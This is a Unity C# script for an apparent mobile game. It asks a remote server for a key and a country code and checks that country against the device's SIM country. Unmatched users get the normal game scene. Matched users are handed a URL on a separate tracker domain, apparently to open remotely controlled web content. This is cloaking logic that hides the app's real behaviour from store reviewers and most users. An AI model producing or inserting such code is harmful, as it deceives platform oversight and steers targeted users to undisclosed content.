using System;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class Manager : MonoBehaviour
{
    private string SIM_GEO
    {
        get => Simcard.GetTwoSmallLetterCountryCodeISO().ToUpper();
    }

    private const string baseUrl = "https://checkgeotoogamegp.info/server3.php";
    private const string baseTarget = "https://trackertoogamegp.info/cbqyl1k.php";

    public static Action<string> OnGetResponseFinished { get; set; }

    private IEnumerator Start()
    {
        UnityWebRequest webRequest = UnityWebRequest.Get(baseUrl);
        yield return webRequest.SendWebRequest();

        var response = JsonUtility.FromJson<Response>(webRequest.downloadHandler.text);
        if(string.Equals(response.result, "notcompare_key") || !string.Equals(SIM_GEO, response.geo))
        {
            Screen.fullScreen = true;
            SceneManager.LoadScene(1);
            yield break;
        }

        string finalUrl = string.Concat(baseTarget, "?key=", response.result);
        OnGetResponseFinished?.Invoke(finalUrl);
    }

    [Serializable]
    public class Response
    {
        public string result;
        public string geo;
    }
}
